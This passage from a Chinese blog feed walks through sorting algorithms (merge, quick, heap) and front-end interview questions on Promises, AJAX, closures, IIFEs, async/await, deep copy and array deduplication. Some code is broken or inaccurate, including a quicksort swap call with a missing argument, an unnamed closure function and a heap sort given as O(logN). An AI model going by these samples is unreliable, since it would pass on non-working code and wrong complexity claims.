class="keyword">array</span>[p2] ? <span class="keyword">array</span>[p1++] : <span class="keyword">array</span>[p2++];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">while</span> (p1 &lt;= mid) &#123;</div><div class="line">    help[i++] = <span class="keyword">array</span>[p1++];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">while</span> (p2 &lt;= right) &#123;</div><div class="line">    help[i++] = <span class="keyword">array</span>[p2++];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; help.length; i++) &#123;</div><div class="line">    <span class="keyword">array</span>[left + i] = help[i];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">array</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>以上算法使用了递归的思想。递归的本质就是压栈，每递归执行一次函数，就将该函数的信息（比如参数，内部的变量，执行到的行数）压栈，直到遇到终止条件，然后出栈并继续执行函数。对于以上递归函数的调用轨迹如下：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">mergeSort(data, <span class="number">0</span>, <span class="number">6</span>) <span class="comment">// mid = 3</span></div><div class="line">  mergeSort(data, <span class="number">0</span>, <span class="number">3</span>) <span class="comment">// mid = 1</span></div><div class="line">    mergeSort(data, <span class="number">0</span>, <span class="number">1</span>) <span class="comment">// mid = 0</span></div><div class="line">      mergeSort(data, <span class="number">0</span>, <span class="number">0</span>) <span class="comment">// 遇到终止，回退到上一步</span></div><div class="line">    mergeSort(data, <span class="number">1</span>, <span class="number">1</span>) <span class="comment">// 遇到终止，回退到上一步</span></div><div class="line">    <span class="comment">// 排序 p1 = 0, p2 = mid + 1 = 1</span></div><div class="line">    <span class="comment">// 回退到 `mergeSort(data, 0, 3)` 执行下一个递归</span></div><div class="line">  mergeSort(<span class="number">2</span>, <span class="number">3</span>) <span class="comment">// mid = 2</span></div><div class="line">    mergeSort(<span class="number">3</span>, <span class="number">3</span>) <span class="comment">// 遇到终止，回退到上一步</span></div><div class="line">  <span class="comment">// 排序 p1 = 2, p2 = mid + 1 = 3</span></div><div class="line">  <span class="comment">// 回退到 `mergeSort(data, 0, 3)` 执行合并逻辑</span></div><div class="line">  <span class="comment">// 排序 p1 = 0, p2 = mid + 1 = 2</span></div><div class="line">  <span class="comment">// 执行完毕回退</span></div><div class="line">  <span class="comment">// 左边数组排序完毕，右边也是如上轨迹</span></div></pre></td></tr></table></figure></p><p>该算法的操作次数是可以这样计算：递归了两次，每次数据量是数组的一半，并且最后把整个数组迭代了一次，所以得出表达式 2T(N / 2) + T(N) （T 代表时间，N 代表数据量）。根据该表达式可以套用 该公式 得出时间复杂度为 O(N * logN)<br><img src="https://i.imgur.com/beqzC1d.gif" alt=""></p><blockquote><p>五、快排</p></blockquote><p>原理：随机选取一个数组中的值作为基准值，从左至右取值与基准值对比大小。比基准值小的放数组左边，大的放右边，对比完成后将基准值和第一个比基准值大的值交换位置。然后将数组以基准值的位置分为两部分，继续递归以上操作。<br>代码实现：<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">function <span class="built_in">sort</span>(array) &#123;</div><div class="line">  checkArray(array);</div><div class="line">  <span class="built_in">quickSort</span>(array, <span class="number">0</span>, array.length - <span class="number">1</span>);</div><div class="line">  <span class="keyword">return</span> array;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function <span class="built_in">quickSort</span>(array, <span class="keyword">left</span>, <span class="keyword">right</span>) &#123;</div><div class="line">  <span class="keyword">if</span> (<span class="keyword">left</span> &lt; <span class="keyword">right</span>) &#123;</div><div class="line">    <span class="built_in">swap</span>(array, , <span class="keyword">right</span>)</div><div class="line">    <span class="comment">// 随机取值，然后和末尾交换，这样做比固定取一个位置的复杂度略低</span></div><div class="line">    <span class="keyword">let</span> indexs = part(array, parseInt(<span class="type">Math</span>.random() * (<span class="keyword">right</span> - <span class="keyword">left</span> + <span class="number">1</span>)) + <span class="keyword">left</span>, <span class="keyword">right</span>);</div><div class="line">    <span class="built_in">quickSort</span>(array, <span class="keyword">left</span>, indexs[<span class="number">0</span>]);</div><div class="line">    <span class="built_in">quickSort</span>(array, indexs[<span class="number">1</span>] + <span class="number">1</span>, <span class="keyword">right</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">function part(array, <span class="keyword">left</span>, <span class="keyword">right</span>) &#123;</div><div class="line">  <span class="keyword">let</span> less = <span class="keyword">left</span> - <span class="number">1</span>;</div><div class="line">  <span class="keyword">let</span> more = <span class="keyword">right</span>;</div><div class="line">  <span class="keyword">while</span> (<span class="keyword">left</span> &lt; more) &#123;</div><div class="line">    <span class="keyword">if</span> (array[<span class="keyword">left</span>] &lt; array[<span class="keyword">right</span>]) &#123;</div><div class="line">      <span class="comment">// 当前值比基准值小，`less` 和 `left` 都加一</span></div><div class="line">   ++less;</div><div class="line">       ++<span class="keyword">left</span>;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (array[<span class="keyword">left</span>] &gt; array[<span class="keyword">right</span>]) &#123;</div><div class="line">      <span class="comment">// 当前值比基准值大，将当前值和右边的值交换</span></div><div class="line">      <span class="comment">// 并且不改变 `left`，因为当前换过来的值还没有判断过大小</span></div><div class="line">      <span class="built_in">swap</span>(array, --more, <span class="keyword">left</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      <span class="comment">// 和基准值相同，只移动下标</span></div><div class="line">      <span class="keyword">left</span>++;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">// 将基准值和比基准值大的第一个值交换位置</span></div><div class="line">  <span class="comment">// 这样数组就变成 `[比基准值小, 基准值, 比基准值大]`</span></div><div class="line">  <span class="built_in">swap</span>(array, <span class="keyword">right</span>, more);</div><div class="line">  <span class="keyword">return</span> [less, more];</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>该算法的复杂度和归并排序是相同的，但是额外空间复杂度比归并排序少，只需 O(logN)，并且相比归并排序来说，所需的常数时间也更少。<br><img src="https://i.imgur.com/CJkbSuw.gif" alt=""></p><blockquote><p>六、计数排序</p></blockquote><p><img src="https://i.imgur.com/hX1CFZV.gif" alt=""></p><blockquote><p>七、堆排序</p></blockquote><p>原理：堆排序<br>堆排序利用了二叉堆的特性来做，二叉堆通常用数组表示，并且二叉堆是一颗完全二叉树（所有叶节点（最底层的节点）都是从左往右顺序排序，并且其他层的节点都是满的）。二叉堆又分为大根堆与小根堆。</p><ul><li>大根堆是某个节点的所有子节点的值都比他小</li><li>小根堆是某个节点的所有子节点的值都比他大<br>堆排序的原理就是组成一个大根堆或者小根堆。以小根堆为例，某个节点的左边子节点索引是 i <em> 2 + 1，右边是 i </em> 2 + 2，父节点是 (i - 1) /2。</li></ul><p>1、首先遍历数组，判断该节点的父节点是否比他小，如果小就交换位置并继续判断，直到他的父节点比他大<br>2、重新以上操作 1，直到数组首位是最大值<br>3、然后将首位和末尾交换位置并将数组长度减一，表示数组末尾已是最大值，不需要再比较大小<br>4、对比左右节点哪个大，然后记住大的节点的索引并且和父节点对比大小，如果子节点大就交换位置<br>5、重复以上操作 3 - 4 直到整个数组都是大根堆。<br>代码实现：<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">function heap(<span class="keyword">array</span>) &#123;</div><div class="line">  checkArray(<span class="keyword">array</span>);</div><div class="line">  <span class="comment">// 将最大值交换到首位</span></div><div class="line">  <span class="built_in">for</span> (let i = <span class="number">0</span>; i &lt; <span class="keyword">array</span>.length; i++) &#123;</div><div class="line">    heapInsert(<span class="keyword">array</span>, i);</div><div class="line">  &#125;</div><div class="line">  let <span class="built_in">size</span> = <span class="keyword">array</span>.length;</div><div class="line">  <span class="comment">// 交换首位和末尾</span></div><div class="line">  swap(<span class="keyword">array</span>, <span class="number">0</span>, --<span class="built_in">size</span>);</div><div class="line">  <span class="built_in">while</span> (<span class="built_in">size</span> &gt; <span class="number">0</span>) &#123;</div><div class="line">    heapify(<span class="keyword">array</span>, <span class="number">0</span>, <span class="built_in">size</span>);</div><div class="line">    swap(<span class="keyword">array</span>, <span class="number">0</span>, --<span class="built_in">size</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">return</span> <span class="keyword">array</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function heapInsert(<span class="keyword">array</span>, index) &#123;</div><div class="line">  <span class="comment">// 如果当前节点比父节点大，就交换</span></div><div class="line">  <span class="built_in">while</span> (<span class="keyword">array</span>[index] &gt; <span class="keyword">array</span>[<span class="built_in">parseInt</span>((index - <span class="number">1</span>) / <span class="number">2</span>)]) &#123;</div><div class="line">    swap(<span class="keyword">array</span>, index, <span class="built_in">parseInt</span>((index - <span class="number">1</span>) / <span class="number">2</span>));</div><div class="line">    <span class="comment">// 将索引变成父节点</span></div><div class="line">    index = <span class="built_in">parseInt</span>((index - <span class="number">1</span>) / <span class="number">2</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">function heapify(<span class="keyword">array</span>, index, <span class="built_in">size</span>) &#123;</div><div class="line">  let left = index * <span class="number">2</span> + <span class="number">1</span>;</div><div class="line">  <span class="built_in">while</span> (left &lt; <span class="built_in">size</span>) &#123;</div><div class="line">    <span class="comment">// 判断左右节点大小</span></div><div class="line">    let largest =</div><div class="line">      left + <span class="number">1</span> &lt; <span class="built_in">size</span> &amp;&amp; <span class="keyword">array</span>[left] &lt; <span class="keyword">array</span>[left + <span class="number">1</span>] ? left + <span class="number">1</span> : left;</div><div class="line">    <span class="comment">// 判断子节点和父节点大小</span></div><div class="line">    largest = <span class="keyword">array</span>[index] &lt; <span class="keyword">array</span>[largest] ? largest : index;</div><div class="line">    <span class="built_in">if</span> (largest === index) <span class="built_in">break</span>;</div><div class="line">    swap(<span class="keyword">array</span>, index, largest);</div><div class="line">    index = largest;</div><div class="line">    left = index * <span class="number">2</span> + <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>以上代码实现了小根堆，如果需要实现大根堆，只需要把节点对比反一下就好。该算法的复杂度是 O(logN)<br><img src="https://i.imgur.com/LbPIhff.gif" alt=""></p><p>每个语言的排序内部实现都是不同的。</p><p>对于 JS 来说，数组长度大于 10 会采用快排，否则使用插入排序 。选择插入排序是因为虽然时间复杂度很差，但是在数据量很小的情况下和 O(N * logN)相差无几，然而插入排序需要的常数时间很小，所以相对别的排序来说更快。</p><p>对于 Java 来说，还会考虑内部的元素的类型。对于存储对象的数组来说，会采用稳定性好的算法。稳定性的意思就是对于相同值来说，相对顺序不能改变。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt; 准备&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;1、时间复杂度：&lt;/p&gt;
&lt;p&gt;通常使用最差的时间复杂度来衡量一个算法的好坏。&lt;/p&gt;
&lt;p&gt;常数时间 O(1) 代表这个操作和数据量没关系，是一个固定时间的操作，比如说四则运算。&lt;/p&gt;
&lt;p&gt;对于一个算法来说，可能会计算出如下操作次数 &lt;code&gt;aN + 1&lt;/code&gt;，&lt;code&gt;N&lt;/code&gt; 代表数据量。那么该算法的时间复杂度就是 &lt;code&gt;O(N)&lt;/code&gt;。因为我们在计算时间复杂度的时候，数据量通常是非常大的，这时候低阶项和常数项可以忽略不计。&lt;/p&gt;
&lt;p&gt;当然可能会出现两个算法都是 &lt;code&gt;O(N)&lt;/code&gt; 的时间复杂度，那么对比两个算法的好坏就要通过对比低阶项和常数项了。&lt;/p&gt;
&lt;p&gt;2、以下两个函数是本章节经常会用到的：&lt;br&gt;&lt;figure class=&quot;highlight vbscript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; checkArray(&lt;span class=&quot;built_in&quot;&gt;array&lt;/span&gt;)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;built_in&quot;&gt;array&lt;/span&gt; || &lt;span class=&quot;built_in&quot;&gt;array&lt;/span&gt;.length &amp;lt;= &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) return&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; swap(&lt;span class=&quot;built_in&quot;&gt;array&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;left&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;right&lt;/span&gt;) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; rightValue = &lt;span class=&quot;built_in&quot;&gt;array&lt;/span&gt;[&lt;span class=&quot;built_in&quot;&gt;right&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;built_in&quot;&gt;array&lt;/span&gt;[&lt;span class=&quot;built_in&quot;&gt;right&lt;/span&gt;] = &lt;span class=&quot;built_in&quot;&gt;array&lt;/span&gt;[&lt;span class=&quot;built_in&quot;&gt;left&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;built_in&quot;&gt;array&lt;/span&gt;[&lt;span class=&quot;built_in&quot;&gt;left&lt;/span&gt;] = rightValue&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>前端总结2</title>
    <link href="wangsiyuan233.github.io/2018/07/17/61%E5%89%8D%E7%AB%AF%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%932/"/>
    <id>wangsiyuan233.github.io/2018/07/17/61前端题目总结2/</id>
    <published>2018-07-17T07:52:52.000Z</published>
    <updated>2018-09-20T03:37:15.632Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><blockquote><p>JS 有哪些数据类型？</p></blockquote><p>七个小矮子：<code>string</code> <code>number</code> <code>bool</code> <code>undefined</code> <code>null</code> <code>object</code> <code>symbol</code><br><code>object</code> 包括了数组、函数、正则、日期等对象<br>一旦出现（数组、函数、正则、日期、NaN）直接0分</p><blockquote><p>（必考） Promise 怎么使用？</p></blockquote><p><a href="https://wangsiyuan233.cn/2018/04/02/36%E5%BC%82%E6%AD%A5%E7%B3%BB%E5%88%97-2/" target="_blank" rel="external">深入理解JavaScript–异步系列(2)</a><br><a id="more"></a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//then</span></div><div class="line">  $.ajax(...).then(成功函数, 失败函数)</div><div class="line"></div><div class="line"><span class="comment">//链式 then</span></div><div class="line">  $.ajax(...).then(成功函数, 失败函数).then(成功函数<span class="number">2</span>, 失败函数<span class="number">2</span>)</div><div class="line"></div><div class="line"><span class="comment">//如何自己生成 Promise 对象</span></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">xxx</span>(<span class="params"></span>)</span>&#123;</div><div class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</div><div class="line">          setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</div><div class="line">              resolve() 或者 reject()</div><div class="line">          &#125;,<span class="number">3000</span>)</div><div class="line">      &#125;)</div><div class="line">  &#125;</div><div class="line">  xxx().then(...)</div></pre></td></tr></table></figure></p><blockquote><p>（必考） AJAX 手写一下？</p></blockquote><p><a href="https://wangsiyuan233.cn/2018/02/17/16AJAX%EF%BC%88%E4%B8%80%EF%BC%89/" target="_blank" rel="external">封装一个ajax</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</div><div class="line">xhr.open(<span class="string">'POST'</span>, <span class="string">'/xxxx'</span>)</div><div class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span> &amp;&amp; xhr.status === <span class="number">200</span>)&#123;</div><div class="line">        <span class="built_in">console</span>.log(xhr.responseText)</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">xhr.send(<span class="string">'a=1&amp;b=2'</span>)</div></pre></td></tr></table></figure></p><blockquote><p>（必考）闭包是什么？</p></blockquote><p><a href="https://wangsiyuan233.cn/2018/03/08/28%E9%97%AD%E5%8C%85%E7%B3%BB%E5%88%97-1/" target="_blank" rel="external">深入理解JavaScript–闭包系列(1)</a><br><a href="https://wangsiyuan233.cn/2018/03/26/29%E9%97%AD%E5%8C%85%E7%B3%BB%E5%88%97-2/" target="_blank" rel="external">深入理解JavaScript–闭包系列(2)</a><br><a href="https://wangsiyuan233.cn/2018/03/27/28%E9%97%AD%E5%8C%85%E7%B3%BB%E5%88%97-3/" target="_blank" rel="external">深入理解JavaScript–闭包系列(3)</a><br><a href="https://wangsiyuan233.cn/2018/03/28/28%E9%97%AD%E5%8C%85%E7%B3%BB%E5%88%97-4/" target="_blank" rel="external">深入理解JavaScript–闭包系列(4)</a><br><a href="https://zhuanlan.zhihu.com/p/22486908" target="_blank" rel="external">JS 中的闭包是什么？</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> n = <span class="number">0</span></div><div class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        n += <span class="number">1</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">let</span>  adder = ()</div><div class="line">adder() <span class="comment">// n === 1</span></div><div class="line">adder() <span class="comment">// n === 2</span></div><div class="line"><span class="built_in">console</span>.log(n) <span class="comment">// n is not defined</span></div></pre></td></tr></table></figure></p><h2 id="★30s总结"><a href="#★30s总结" class="headerlink" title="★30s总结"></a>★30s总结</h2><ul><li>定义：「函数」和「函数内部能访问到的变量」（也叫环境）的总和，就是一个闭包。</li><li>作用：闭包常常用来「间接访问一个变量」。换句话说，「隐藏一个变量」。</li><li>IE 有 bug，IE 在我们使用完闭包之后，依然回收不了闭包里面引用的变量。<blockquote><p>（必考）这段代码里的 this 是什么？</p></blockquote></li></ul><p><a href="https://wangsiyuan233.cn/2018/03/05/27%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-2/" target="_blank" rel="external">聊聊系列(2)–this</a></p><blockquote><p>（必考）什么是立即执行函数？使用立即执行函数的目的是什么？</p></blockquote><p><a href="https://zhuanlan.zhihu.com/p/22465092" target="_blank" rel="external">方应航–立即执行函数</a><br>ES 6 新语法 <code>{let  name}</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">;(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> name</div><div class="line">&#125;())</div><div class="line">;(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> name</div><div class="line">&#125;)()</div><div class="line">!!!!!!!<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> name</div><div class="line">&#125;()</div><div class="line">~<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> name</div><div class="line">&#125;()</div></pre></td></tr></table></figure></p><h2 id="★30s总结-1"><a href="#★30s总结-1" class="headerlink" title="★30s总结"></a>★30s总结</h2><ul><li>定义：声明一个匿名函数，并且马上调用这个匿名函数</li><li>作用：创建一个独立的作用域。这个作用域里面的变量，外面访问不到（即避免「变量污染」）。<blockquote><p>async/await 语法了解吗？目的是什么？</p></blockquote></li></ul><p>目的：把异步代码写成同步代码。<br>原理：<a href="https://wangsiyuan233.cn/2018/08/23/70%E5%BC%82%E6%AD%A5%E7%B3%BB%E5%88%97-4/" target="_blank" rel="external">深入理解JavaScript–异步系列(4)</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">returnPromise</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>( <span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</div><div class="line">        setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</div><div class="line">            resolve(<span class="string">'happy'</span>)</div><div class="line">        &#125;,<span class="number">3000</span>)</div><div class="line">    &#125;)</div><div class="line">&#125;</div><div class="line"></div><div class="line">returnPromise().then(<span class="function">(<span class="params">result</span>)=&gt;</span>&#123;</div><div class="line">    result === <span class="string">'happy'</span></div><div class="line">&#125;)</div><div class="line"></div><div class="line"><span class="keyword">var</span> result = <span class="keyword">await</span> returnPromise()</div><div class="line">result === <span class="string">'happy'</span></div></pre></td></tr></table></figure></p><h2 id="★30s总结-2"><a href="#★30s总结-2" class="headerlink" title="★30s总结"></a>★30s总结</h2><ul><li>await 只能跟在 async后面</li><li>套娃 async/await 的目的是把异步代码写成同步代码。<blockquote><p>如何实现深拷贝？</p></blockquote></li></ul><p>【javascript】详解javaScript的深拷贝](<a href="https://www.cnblogs.com/penghuwan/p/7359026.html" target="_blank" rel="external">https://www.cnblogs.com/penghuwan/p/7359026.html</a>)</p><p>1) JSON 来深拷贝<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = <span class="meta">&#123;...&#125;</span></div><div class="line"><span class="keyword">var</span> b = <span class="type">JSON</span>.parse( <span class="type">JSON</span>.stringify(a) )</div></pre></td></tr></table></figure></p><p>缺点：JSON 不支持函数、引用、undefined、RegExp、Date……</p><p>2) 递归拷贝<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">function clone(<span class="class"><span class="keyword">object</span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> object2</div><div class="line">    <span class="keyword">if</span>(! (<span class="class"><span class="keyword">object</span> <span class="title">instanceof</span> <span class="title">Object</span>) )</span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="class"><span class="keyword">object</span></span></div><div class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="class"><span class="keyword">object</span> <span class="title">instanceof</span> <span class="title">Array</span>)</span>&#123;</div><div class="line">        object2 = []</div><div class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="class"><span class="keyword">object</span> <span class="title">instanceof</span> <span class="title">Function</span>)</span>&#123;</div><div class="line">        object2 = eval(<span class="class"><span class="keyword">object</span>.<span class="title">toString</span>(<span class="params"></span>))</span></div><div class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="class"><span class="keyword">object</span> <span class="title">instanceof</span> <span class="title">Object</span>)</span>&#123;</div><div class="line">        object2 = &#123;&#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//你也可以把 Array Function Object 都当做 Object 来看待，参考 https://juejin.im/post/587dab348d6d810058d87a0a</span></div><div class="line">    <span class="keyword">for</span>(let key in <span class="class"><span class="keyword">object</span>)</span>&#123;</div><div class="line">        object2[key] = clone(<span class="class"><span class="keyword">object</span>[key])</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> object2</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><blockquote><p>如何实现数组去重？</p></blockquote><p>1) 计数排序的逻辑（只能正整数）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">var a = [4,2,5,6,3,4,5]</div><div class="line"> var <span class="built_in">hash</span>Tab = &#123;&#125;</div><div class="line"> <span class="keyword">for</span>(<span class="built_in">let</span> i=0; i&lt;a.length;i++)&#123;</div><div class="line">     <span class="keyword">if</span>(a[i] <span class="keyword">in</span> <span class="built_in">hash</span>Tab)&#123;</div><div class="line">         // 什么也不做</div><div class="line">     &#125;<span class="keyword">else</span>&#123;</div><div class="line">         <span class="built_in">hash</span>Tab[ a[i] ] = <span class="literal">true</span></div><div class="line">     &#125;</div><div class="line"> &#125;</div><div class="line"> //<span class="built_in">hash</span>Tab: &#123;4: <span class="literal">true</span>, 2: <span class="literal">true</span>, 5: <span class="literal">true</span>, 6:<span class="literal">true</span>, 3: <span class="literal">true</span>&#125;</div><div class="line"> console.log(Object.keys(<span class="built_in">hash</span>Tab)) // [<span class="string">'4'</span>,<span class="string">'2'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'3'</span>]</div></pre></td></tr></table></figure></p><p>2) Set 去重<br> <code>Array.from(new Set(a))</code></p><blockquote><p>如何用正则实现 string.trim() ？</p></blockquote><figure class="highlight qml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">trim</span>(<span class="params">string</span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="built_in">string</span>.replace(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">''</span>)</div><div 